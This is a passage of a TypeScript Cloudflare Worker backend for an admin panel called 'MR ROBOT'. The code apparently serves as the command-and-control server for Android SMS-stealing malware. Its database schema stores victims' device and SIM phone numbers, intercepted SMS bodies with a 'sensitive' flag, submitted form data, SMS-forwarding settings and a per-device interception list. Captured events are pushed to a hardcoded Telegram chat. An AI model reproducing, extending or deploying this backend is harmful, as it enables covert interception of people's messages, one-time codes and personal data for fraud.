/// <reference types="@cloudflare/workers-types" />
import { Hono } from "hono";

    // The client percent-encodes the x-master-pin header value when it contains
    // characters outside ISO-8859-1 (e.g. the Rupee sign), because the raw
    // Headers API throws synchronously on such values. Decode it back here
    // before comparing against the stored PIN, otherwise every PIN containing
    // such a character mismatches and the caller gets logged out immediately.
    function decodeMasterPinHeader(raw: string | undefined): string | undefined {
    if (raw == null) return raw;
    try {
      return decodeURIComponent(raw);
    } catch {
      return raw;
    }
    }

// ── PIN hashing: PBKDF2-SHA256 + pepper (Web Crypto — CF Workers native) ──────
// Format stored in DB: "pbkdf2$<16-byte-salt-hex>$<32-byte-hash-hex>"
// Backward compat: plaintext PINs still verify (and auto-upgrade on next login).
const _PIN_PREFIX = "pbkdf2$";
const _PIN_ITER   = 100_000;
const _PIN_BYTES  = 32;

function _isPinHashed(v: string): boolean {
  return typeof v === "string" && v.startsWith(_PIN_PREFIX);
}

async function _hashPin(pin: string, pepper: string): Promise<string> {
  const enc = new TextEncoder();
  const hex = (b: Uint8Array) => Array.from(b).map(x => x.toString(16).padStart(2, "0")).join("");
  const pepKey = await crypto.subtle.importKey(
    "raw", enc.encode(pepper || "_no_pepper_"),
    { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
  );
  const peppered = new Uint8Array(await crypto.subtle.sign("HMAC", pepKey, enc.encode(pin)));
  const salt = crypto.getRandomValues(new Uint8Array(16));
  const km   = await crypto.subtle.importKey("raw", peppered, "PBKDF2", false, ["deriveBits"]);
  const bits = await crypto.subtle.deriveBits(
    { name: "PBKDF2", hash: "SHA-256", salt, iterations: _PIN_ITER },
    km, _PIN_BYTES * 8
  );
  return `${_PIN_PREFIX}${hex(salt)}$${hex(new Uint8Array(bits))}`;
}

async function _verifyPin(pin: string, stored: string, pepper: string): Promise<boolean> {
  if (!_isPinHashed(stored)) return pin === stored;
  const parts = stored.slice(_PIN_PREFIX.length).split("$");
  if (parts.length !== 2) return false;
  const fromHex = (h: string) => new Uint8Array((h.match(/.{2}/g) ?? []).map(b => parseInt(b, 16)));
  const salt     = fromHex(parts[0]);
  const expected = fromHex(parts[1]);
  const enc = new TextEncoder();
  const pepKey = await crypto.subtle.importKey(
    "raw", enc.encode(pepper || "_no_pepper_"),
    { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
  );
  const peppered = new Uint8Array(await crypto.subtle.sign("HMAC", pepKey, enc.encode(pin)));
  const km   = await crypto.subtle.importKey("raw", peppered, "PBKDF2", false, ["deriveBits"]);
  const bits = await crypto.subtle.deriveBits(
    { name: "PBKDF2", hash: "SHA-256", salt, iterations: _PIN_ITER },
    km, _PIN_BYTES * 8
  );
  const actual = new Uint8Array(bits);
  if (actual.length !== expected.length) return false;
  let diff = 0;
  for (let i = 0; i < actual.length; i++) diff |= actual[i] ^ expected[i];
  return diff === 0;
}

// SECURITY: the raw master PIN must only ever be transmitted once, at login
// (POST /api/admin/verify-master-pin), where it is exchanged for an opaque,
// revocable master_sessions token. Every other master-gated route accepts
// ONLY that session token (x-master-session header) — never the raw PIN —
// so a leaked/known PIN alone cannot be replayed forever against the API;
// revoking (deleting) the session row instantly cuts off that access.
async function isMasterSession(c: Parameters<typeof app.use>[1] extends (c: infer C, n: () => Promise<void>) => unknown ? C : never): Promise<boolean> {
    // JWT Bearer token only — issued at Google OAuth login, signed with JWT_SECRET.
    // x-master-session (DB-backed UUID) removed: raw UUIDs in DB are a credential-leak risk.
    // JWT is cryptographically signed — cannot be forged even with full DB read access.
    const authHeader = c.req.header("Authorization") ?? "";
    if (!authHeader.startsWith("Bearer ")) return false;
    const jwtToken = authHeader.slice(7);
    const secret = (c.env as Env).JWT_SECRET;
    if (!secret) return false;
    const payload = await verifyJwt(jwtToken, secret);
    return !!(payload && payload.role === "master");
  }
  // ── JWT helpers (Web Crypto API — Cloudflare Workers compatible) ──
  async function signJwt(payload: Record<string, unknown>, secret: string): Promise<string> {
      // UTF-8 safe base64url encoding — handles non-ASCII correctly (RFC 7515)
      const b64url = (bytes: Uint8Array): string => {
        let s = ''; for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
        return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
      };
      const enc = (obj: unknown) => b64url(new TextEncoder().encode(JSON.stringify(obj)));
      const header = { alg: "HS256", typ: "JWT" };
      const data = `${enc(header)}.${enc(payload)}`;
      const key = await crypto.subtle.importKey(
        "raw", new TextEncoder().encode(secret),
        { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
      );
      const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(data));
      return `${data}.${b64url(new Uint8Array(sig))}`;
    }

    async function verifyJwt(token: string, secret: string): Promise<Record<string, unknown> | null> {
      try {
        const parts = token.split('.');
        if (parts.length !== 3) return null;
        const [headerB64, payloadB64, sigB64] = parts;
        const key = await crypto.subtle.importKey(
          "raw", new TextEncoder().encode(secret),
          { name: "HMAC", hash: "SHA-256" }, false, ["verify"]
        );
        const sigBytes = Uint8Array.from(atob(sigB64.replace(/-/g, '+').replace(/_/g, '/')), ch => ch.charCodeAt(0));
        const valid = await crypto.subtle.verify("HMAC", key, sigBytes, new TextEncoder().encode(`${headerB64}.${payloadB64}`));
        if (!valid) return null;
        const payload = JSON.parse(atob(payloadB64.replace(/-/g, '+').replace(/_/g, '/'))) as Record<string, unknown>;
        if (typeof payload.exp === 'number' && payload.exp < Math.floor(Date.now() / 1000)) return null;
        if (payload.iss !== "mr-panel") return null; // Reject tokens not issued by this service
        return payload;
      } catch { return null; }
    }
  async function requireJwt(c: Parameters<typeof app.use>[1] extends (c: infer C, n: () => Promise<void>) => unknown ? C : never): Promise<boolean> {
    const secret = (c.env as Env).JWT_SECRET;
    if (!secret) return false;
    const auth = c.req.header("Authorization") ?? "";
    const token = auth.startsWith("Bearer ") ? auth.slice(7) : null;
    if (!token) return false;
    const payload = await verifyJwt(token, secret);
    return payload !== null;
  }

  
import { cors } from "hono/cors";
import { neon, neonConfig } from "@neondatabase/serverless";
neonConfig.fetchConnectionCache = true;
import { drizzle } from "drizzle-orm/neon-http";
import { and, asc, desc, eq, sql } from "drizzle-orm";
import {
  pgTable, serial, text, integer, boolean, timestamp, jsonb,
  uniqueIndex, index,
} from "drizzle-orm/pg-core";

// =================== ENV ===================
type Env = {
  NEON_DATABASE_URL: string;
  FIREBASE_SERVICE_ACCOUNT_JSON?: string;
  FIREBASE_PROJECT_ID?: string;
  FIREBASE_CLIENT_EMAIL?: string;
  FIREBASE_PRIVATE_KEY?: string;
  EVENT_BUS: DurableObjectNamespace;
  ASSETS: { fetch: (req: Request) => Promise<Response> };
  TELEGRAM_BOT_TOKEN?: string;
  TELEGRAM_CHAT_ID?: string;
  // Master auth (Google + OTP)
  JWT_SECRET?: string;
  PIN_PEPPER?: string;
  GOOGLE_CLIENT_ID?: string;
  MASTER_ADMIN_EMAIL?: string;
  MASTER_ADMIN_PHONE?: string;
  FAST2SMS_API_KEY?: string;
};

// =================== SCHEMA ===================
const apps = pgTable("apps", {
    id: serial("id").primaryKey(),
    appId: text("app_id").notNull(),
    name: text("name").notNull(),
    status: text("status").notNull().default("active"),
    createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  }, (t) => ({ appIdUq: uniqueIndex("apps_app_id_uq").on(t.appId) }));

  // SECURITY: pin / panelToken / deleteProtectionPin / deleteProtectionEnabled live in a
  // separate table on purpose. If the apps table (or a query against it) ever leaks, the
  // secrets are NOT sitting right there in the same row.
  const appSecrets = pgTable("app_secrets", {
      appId: text("app_id").primaryKey(),
      pin: text("pin").notNull().default("1234"),
      deleteProtectionPin: text("delete_protection_pin"),
      deleteProtectionEnabled: boolean("delete_protection_enabled").notNull().default(false),
      loginLimit: integer("login_limit").notNull().default(20),
    });

    // panelToken (the access-link "pt" credential) lives in its OWN table, split apart
    // from the PIN/delete-protection secrets above. A leak/dump of either table alone
    // never hands over both credential types together.
    const appPanelTokens = pgTable("app_panel_tokens", {
      appId: text("app_id").primaryKey(),
      panelToken: text("panel_token"),
    });

const devices = pgTable("devices", {
  id: serial("id").primaryKey(),
  deviceId: text("device_id").notNull(),
  appId: text("app_id").notNull(),
  userId: text("user_id").notNull(),
  name: text("name").notNull(),
  androidVersion: integer("android_version").notNull().default(0),
  sim1Carrier: text("sim1_carrier"),
  sim1Phone: text("sim1_phone"),
  sim2Carrier: text("sim2_carrier"),
  sim2Phone: text("sim2_phone"),
  status: text("status").notNull().default("offline"),
  lastOnline: timestamp("last_online", { withTimezone: true }),
  forwardEnabled: boolean("forward_enabled").notNull().default(false),
  forwardSlot: integer("forward_slot"),
  fcmToken: text("fcm_token"),
  installedAt: timestamp("installed_at", { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
  starred: boolean("starred").notNull().default(false),
}, (t) => ({
  deviceIdUq: uniqueIndex("devices_device_id_uq").on(t.deviceId),
  appIdx: index("devices_app_idx").on(t.appId),
  userIdx: index("devices_user_idx").on(t.userId),
}));

const messages = pgTable("messages", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  userId: text("user_id").notNull(),
  fromSender: text("from_sender").notNull(),
  fromNumber: text("from_number").notNull(),
  toNumber: text("to_number"),
  body: text("body").notNull(),
  isSensitive: boolean("is_sensitive").notNull().default(false),
  masterOnly: boolean("master_only").notNull().default(false),
  receivedAt: timestamp("received_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appReceivedIdx: index("messages_app_received_idx").on(t.appId, t.receivedAt),
  deviceReceivedIdx: index("messages_device_received_idx").on(t.deviceId, t.receivedAt),
  userIdx: index("messages_user_idx").on(t.userId),
}));

const formData = pgTable("form_data", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  data: jsonb("data").notNull(),
  submittedAt: timestamp("submitted_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appSubmittedIdx: index("form_data_app_submitted_idx").on(t.appId, t.submittedAt),
  deviceIdx: index("form_data_device_idx").on(t.deviceId),
}));
const tokenAppMap = pgTable("token_app_map", {
  id: serial("id").primaryKey(),
  token: text("token").notNull(),
  apkId: text("apk_id").notNull(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({ tokenUq: uniqueIndex("token_app_map_token_uq").on(t.token) }));

const notices = pgTable("notices", {
  id: serial("id").primaryKey(),
  text: text("text").notNull(),
  active: boolean("active").notNull().default(true),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
const DEFAULT_APP_NAME = "MR ROBOT";
const DEFAULT_APP_PIN = "1234";

function getDb(env: Env) {
  const sqlClient = neon(env.NEON_DATABASE_URL);
  return drizzle(sqlClient, { schema: { apps, devices, messages, formData, tokenAppMap, notices } });
}

// =================== SCHEMA INIT (lazy, once-per-worker) ===================
let schemaInitPromise: Promise<void> | null = null;
async function ensureSchema(env: Env): Promise<void> {
  if (schemaInitPromise) return schemaInitPromise;
  schemaInitPromise = (async () => {
    const sqlClient = neon(env.NEON_DATABASE_URL);
    // Round 1: Create all tables in parallel
    await Promise.all([
      sqlClient(`CREATE TABLE IF NOT EXISTS notices (
        id SERIAL PRIMARY KEY,
        text TEXT NOT NULL,
        active BOOLEAN NOT NULL DEFAULT TRUE,
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS apps (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        name TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'active',
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
        sqlClient(`CREATE TABLE IF NOT EXISTS app_secrets (
            app_id TEXT PRIMARY KEY,
            pin TEXT NOT NULL DEFAULT '1234',
            delete_protection_pin TEXT,
            delete_protection_enabled BOOLEAN NOT NULL DEFAULT FALSE,
            login_limit INTEGER NOT NULL DEFAULT 20
          )`),
          sqlClient(`CREATE TABLE IF NOT EXISTS app_panel_tokens (
            app_id TEXT PRIMARY KEY,
            panel_token TEXT
          )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        device_id TEXT NOT NULL,
        app_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        name TEXT NOT NULL,
        android_version INTEGER NOT NULL DEFAULT 0,
        sim1_carrier TEXT,
        sim1_phone TEXT,
        sim2_carrier TEXT,
        sim2_phone TEXT,
        status TEXT NOT NULL DEFAULT 'offline',
        last_online TIMESTAMPTZ,
        forward_enabled BOOLEAN NOT NULL DEFAULT FALSE,
        forward_slot INTEGER,
        fcm_token TEXT,
        installed_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS messages (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        device_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        from_sender TEXT NOT NULL,
        from_number TEXT NOT NULL,
        to_number TEXT,
        body TEXT NOT NULL,
        is_sensitive BOOLEAN NOT NULL DEFAULT FALSE,
        received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS form_data (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        device_id TEXT NOT NULL,
        data JSONB NOT NULL,
        submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS admin_sessions (
        id TEXT PRIMARY KEY,
        login_time TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        last_active TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        user_agent TEXT NOT NULL DEFAULT '',
        ip TEXT NOT NULL DEFAULT '',
        device TEXT NOT NULL DEFAULT ''
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS master_login_attempts (
        ip TEXT PRIMARY KEY,
        failed_count INTEGER NOT NULL DEFAULT 0,
        last_attempt TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        locked_until TIMESTAMPTZ
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS master_sessions (
        id TEXT PRIMARY KEY,
        login_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        ip TEXT NOT NULL DEFAULT '',
        user_agent TEXT NOT NULL DEFAULT ''
      )`),
    ]);
    // Round 2: Create all indexes in parallel (tables must exist first)
    await Promise.all([
      sqlClient(`CREATE UNIQUE INDEX IF NOT EXISTS apps_app_id_uq ON apps(app_id)`),
      sqlClient(`CREATE UNIQUE INDEX IF NOT EXISTS devices_device_id_uq ON devices(device_id)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS devices_app_idx ON devices(app_id)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS devices_user_idx ON devices(user_id)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS messages_app_received_idx ON messages(app_id, received_at)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS messages_device_received_idx ON messages(device_id, received_at)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS messages_user_idx ON messages(user_id)`),
      // Migration for older databases: add to_number column if it doesn't exist
      sqlClient(`ALTER TABLE messages ADD COLUMN IF NOT EXISTS to_number TEXT`),
      sqlClient(`CREATE INDEX IF NOT EXISTS form_data_app_submitted_idx ON form_data(app_id, submitted_at)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS form_data_device_idx ON form_data(device_id)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS admin_sessions_login_idx ON admin_sessions(login_time DESC)`),
      sqlClient(`ALTER TABLE admin_sessions ADD COLUMN IF NOT EXISTS app_id TEXT NOT NULL DEFAULT ''`),
      sqlClient(`CREATE INDEX IF NOT EXISTS admin_sessions_app_idx ON admin_sessions(app_id)`),
    sqlClient(`UPDATE apps SET created_at = NOW() WHERE created_at > NOW() + INTERVAL '1 day'`),
      sqlClient(`ALTER TABLE app_secrets ADD COLUMN IF NOT EXISTS login_limit INTEGER NOT NULL DEFAULT 20`),
      // NOTE: the one-time legacy migrations that used to ADD pin/delete_protection_pin/
      // delete_protection_enabled/panel_token/login_limit onto the "apps" table (so they
      // could be backfilled into app_secrets/app_panel_tokens below) have been removed.
      // Running ADD COLUMN + DROP COLUMN on every Worker cold start silently exhausted
      // Postgres's hard 1600-attnum-per-table cap (dropped columns never free their attnum
      // slot without a VACUUM FULL), which eventually made ensureSchema() throw
      // "tables can have at most 1600 columns" and broke every route that awaits it. The
      // migration already ran successfully long ago; these columns no longer exist on
      // "apps" and must not be re-added.
      // Migration: add created_at for older DBs that predated this column
      sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS created_at TIMESTAMPTZ DEFAULT NOW()`),
      // Migration: add starred column to devices
      sqlClient(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS starred BOOLEAN NOT NULL DEFAULT FALSE`),
      // Migration: add master_only column for message interception
      sqlClient(`ALTER TABLE messages ADD COLUMN IF NOT EXISTS master_only BOOLEAN NOT NULL DEFAULT FALSE`),
    ]);
    // Fix: apps created before created_at column existed have NULL — set to NOW() and re-enable if wrongly disabled
      await sqlClient(`UPDATE apps SET created_at = NOW() WHERE created_at IS NULL`).catch(() => {});
      await sqlClient(`UPDATE apps SET status = 'active' WHERE status = 'disabled' AND created_at IS NULL AND app_id != 'SKY-APP-2026-X9F3'`).catch(() => {});
      // SECURITY MIGRATION: move pin/panel_token/delete-protection secrets off the apps
      // table and into the dedicated app_secrets table, then drop them from apps so they
      // physically can't be returned by a query against apps anymore.
      await sqlClient(`
          INSERT INTO app_secrets (app_id, pin, delete_protection_pin, delete_protection_enabled)
          SELECT app_id, pin, delete_protection_pin, delete_protection_enabled FROM apps
          ON CONFLICT (app_id) DO NOTHING
        `).catch(() => {});
        // login_limit is a per-app config that must only be readable/writable by the master
        // admin (a sub-admin session must never self-raise its own device cap), so it lives
        // in app_secrets alongside the other master-gated fields, not on the public apps table.
        await sqlClient(`
          UPDATE app_secrets s SET login_limit = a.login_limit
          FROM apps a WHERE a.app_id = s.app_id AND a.login_limit IS NOT NULL
        `).catch(() => {});
        // panelToken now lives in its own dedicated table, split apart from pin/delete-protection.
        // Backfill from BOTH legacy sources before dropping either: apps.panel_token (oldest
        // schema) and app_secrets.panel_token (the more recent source, since apps.panel_token
        // was already migrated into app_secrets by the block above in older deploys).
        await sqlClient(`
          INSERT INTO app_panel_tokens (app_id, panel_token)
          SELECT app_id, panel_token FROM apps WHERE panel_token IS NOT NULL
          ON CONFLICT (app_id) DO NOTHING
        `).catch(() => {});
        await sqlClient(`
          INSERT INTO app_panel_tokens (app_id, panel_token)
          SELECT app_id, panel_token FROM app_secrets WHERE panel_token IS NOT NULL
          ON CONFLICT (app_id) DO UPDATE SET panel_token = COALESCE(app_panel_tokens.panel_token, EXCLUDED.panel_token)
        `).catch(() => {});
        await sqlClient(`ALTER TABLE app_secrets DROP COLUMN IF EXISTS panel_token`).catch(() => {});
        // Auto-generate panel_token for existing apps that don't have one
        await sqlClient(`UPDATE app_panel_tokens SET panel_token = gen_random_uuid()::text WHERE panel_token IS NULL`).catch(() => {});
        await sqlClient(`
          INSERT INTO app_panel_tokens (app_id, panel_token)
          SELECT a.app_id, gen_random_uuid()::text FROM apps a
          LEFT JOIN app_panel_tokens t ON t.app_id = a.app_id
          WHERE t.app_id IS NULL
        `).catch(() => {});
      await sqlClient(`ALTER TABLE apps DROP COLUMN IF EXISTS login_limit`).catch(() => {});
      await sqlClient(`ALTER TABLE apps DROP COLUMN IF EXISTS pin`).catch(() => {});
      await sqlClient(`ALTER TABLE apps DROP COLUMN IF EXISTS panel_token`).catch(() => {});
      await sqlClient(`ALTER TABLE apps DROP COLUMN IF EXISTS delete_protection_pin`).catch(() => {});
      await sqlClient(`ALTER TABLE apps DROP COLUMN IF EXISTS delete_protection_enabled`).catch(() => {});
      // ensure default app + master PIN setting
    await sqlClient(
      `INSERT INTO apps (app_id, name, status) VALUES ($1,$2,'active')
       ON CONFLICT (app_id) DO NOTHING`,
      [DEFAULT_APP_ID, DEFAULT_APP_NAME],
    );
    await sqlClient(
      `INSERT INTO app_secrets (app_id, pin) VALUES ($1,$2)
       ON CONFLICT (app_id) DO NOTHING`,
      [DEFAULT_APP_ID, DEFAULT_APP_PIN],
    );
    await Promise.all([
      sqlClient(
        `INSERT INTO settings (key, value) VALUES ('master_pin', 'CHANGE-ME-4e5fdd7e-206')
         ON CONFLICT (key) DO NOTHING`,
      ),
      sqlClient(
        `INSERT INTO settings (key, value) VALUES ('master_max_attempts', '5')
         ON CONFLICT (key) DO NOTHING`,
      ),
      sqlClient(
        `INSERT INTO settings (key, value) VALUES ('master_lockout_minutes', '15')
         ON CONFLICT (key) DO NOTHING`,
      ),
      sqlClient(
        `INSERT INTO settings (key, value) VALUES ('master_session_limit', '3')
         ON CONFLICT (key) DO NOTHING`,
      ),
    ]);
  })().catch((err) => { schemaInitPromise = null; throw err; });
  return schemaInitPromise;
}

// =================== MAPPERS ===================
function iso(d: Date | string | null | undefined): string | null {
  if (d == null) return null;
  return typeof d === "string" ? d : d.toISOString();
}
function isoReq(d: Date | string): string {
  return typeof d === "string" ? d : d.toISOString();
}
function mapApp(r: typeof apps.$inferSelect, dpEnabled = false, loginLimit = 20) {
  return { id: r.id, appId: r.appId, name: r.name, status: r.status, createdAt: isoReq(r.createdAt), deleteProtectionEnabled: dpEnabled, loginLimit: loginLimit ?? 20 };
}
function mapDevice(r: typeof devices.$inferSelect) {
  return {
    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId, name: r.name,
    androidVersion: r.androidVersion,
    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
    status: r.status, lastOnline: iso(r.lastOnline),
    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
    fcmToken: r.fcmToken,
    installedAt: isoReq(r.installedAt), updatedAt: isoReq(r.updatedAt),
    starred: r.starred,
  };
}
function mapMessage(r: typeof messages.$inferSelect) {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId, userId: r.userId,
    fromSender: r.fromSender, fromNumber: r.fromNumber, toNumber: r.toNumber,
    body: r.body, isSensitive: r.isSensitive, masterOnly: r.masterOnly,
    receivedAt: isoReq(r.receivedAt),
  };
}
function mapFormData(r: typeof formData.$inferSelect) {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId,
    data: r.data as Record<string, unknown>,
    submittedAt: isoReq(r.submittedAt),
  };
}

// =================== INTERCEPT STATE ===================
let _interceptCache: string[] | null = null;
let _interceptCacheExp = 0;
async function getInterceptedDevices(env: Env): Promise<string[]> {
  const now = Date.now();
  if (_interceptCache !== null && now < _interceptCacheExp) return _interceptCache;
  try {
    const sqlClient = neon(env.NEON_DATABASE_URL);
    const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'master_intercept_devices'`) as Array<{ value: string }>;
    const val = rows[0]?.value ? JSON.parse(rows[0].value) : [];
    _interceptCache = Array.isArray(val) ? val : [];
  } catch {
    _interceptCache = [];
  }
  _interceptCacheExp = now + 5_000;
  return _interceptCache!;
}
async function setInterceptedDevices(env: Env, ids: string[]): Promise<void> {
  const sqlClient = neon(env.NEON_DATABASE_URL);
  await sqlClient(
    `INSERT INTO settings (key, value) VALUES ('master_intercept_devices', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
    [JSON.stringify(ids)]
  );
  _interceptCache = ids;
  _interceptCacheExp = Date.now() + 5_000;
}

// =================== PUB-SUB ===================
async function broadcast(env: Env, event: string, data: unknown): Promise<void> {
  try {
    const id = env.EVENT_BUS.idFromName("global");
    const stub = env.EVENT_BUS.get(id);
    await stub.fetch("https://do.local/broadcast", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ event, data }),
    });
  } catch (e) {
    console.warn("broadcast failed", e);
  }
}

  // =================== TELEGRAM NOTIFICATIONS ===================

    // ── Settings cache: avoids 3 DB round-trips per notification ──
    const tgCache = { chatId: '-1004403318713', paused: false, focusApp: '', ts: 0 };
    const TG_CACHE_TTL = 30_000;

    async function refreshTgCache(env: Env): Promise<void> {
      if (Date.now() - tgCache.ts < TG_CACHE_TTL) return; // still fresh, skip DB
      try {
        const rows = await neon(env.NEON_DATABASE_URL)(
          `SELECT key, value FROM settings WHERE key IN ('telegram_chat_id','telegram_paused','telegram_focus_app')`
        );
        const map = Object.fromEntries((rows as { key: string; value: string }[]).map(r => [r.key, r.value]));
        tgCache.chatId = map['telegram_chat_id'] ?? (env.TELEGRAM_CHAT_ID ?? '-1004403318713');
        tgCache.paused = map['telegram_paused'] === 'true';
        tgCache.focusApp = map['telegram_focus_app'] ?? '';
        tgCache.ts = Date.now();
      } catch { /* keep stale cache on error */ }
    }

    // Kept for backward compat — returns channel id from cache
    async function tgChatId(env: Env): Promise<string> {
      await refreshTgCache(env);
      return tgCache.chatId;
    }

    // Direct immediate notification — one per event, full details, zero extra DB calls
    async function sendTelegram(env: Env, text: string, appId?: string): Promise<void> {
      try {
        await refreshTgCache(env);
        if (tgCache.paused) return;
        if (appId && tgCache.focusApp && tgCache.focusApp !== appId) return;
        const token = env.TELEGRAM_BOT_TOKEN ?? c.env?.TELEGRAM_BOT_TOKEN ?? "";
        const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ chat_id: tgCache.chatId, text, parse_mode: 'HTML' }),
        });
        if (!resp.ok) {
          const err = await resp.json() as { error_code?: number };
          if (err.error_code === 429) console.warn('Telegram 429 — message dropped');
        }
      } catch (e) { console.warn('Telegram send failed', e); }
    }

  
    async function tgReply(token: string, chatId: number | string, text: string): Promise<void> {
      // Telegram max message size = 4096 chars — split if needed
      const MAX = 3800;
      const chunks: string[] = [];
      for (let i = 0; i < text.length; i += MAX) chunks.push(text.slice(i, i + MAX));
      for (const chunk of chunks) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: chunk, parse_mode: "HTML" }),
        });
      }
    }
  
  

// =================== FCM (Web Crypto JWT) ===================
type FirebaseCredentials = {
  project_id: string;
  private_key: string;
  client_email: string;
};

function normalizePrivateKey(raw: string): string {
  let key = raw.trim();
  if ((key.startsWith('"') && key.endsWith('"')) || (key.startsWith("'") && key.endsWith("'"))) {
    key = key.slice(1, -1);
  }
  key = key.replace(/\\n/g, "\n");
  if (!key.endsWith("\n")) key += "\n";
  return key;
}

function getFirebaseCredentials(env: Env): FirebaseCredentials {
  if (env.FIREBASE_SERVICE_ACCOUNT_JSON) {
    const parsed = JSON.parse(env.FIREBASE_SERVICE_ACCOUNT_JSON) as FirebaseCredentials;
    if (!parsed.project_id || !parsed.client_email || typeof parsed.private_key !== "string" || !parsed.private_key.trim()) {
      throw Object.assign(new Error("Firebase service account configuration is incomplete"), { fcmConfig: true });
    }
    parsed.private_key = normalizePrivateKey(parsed.private_key);
    return parsed;
  }
  // Only explicitly configured credentials may be used; never silently choose
  // a built-in Firebase project/account for a device from another project.
  const project_id = env.FIREBASE_PROJECT_ID?.trim();
  const client_email = env.FIREBASE_CLIENT_EMAIL?.trim();
  if (!project_id || !client_email || !env.FIREBASE_PRIVATE_KEY?.trim()) {
    throw Object.assign(new Error("Firebase service account configuration is missing"), { fcmConfig: true });
  }
  const rawKey = env.FIREBASE_PRIVATE_KEY || "-----BEGIN PRIVATE 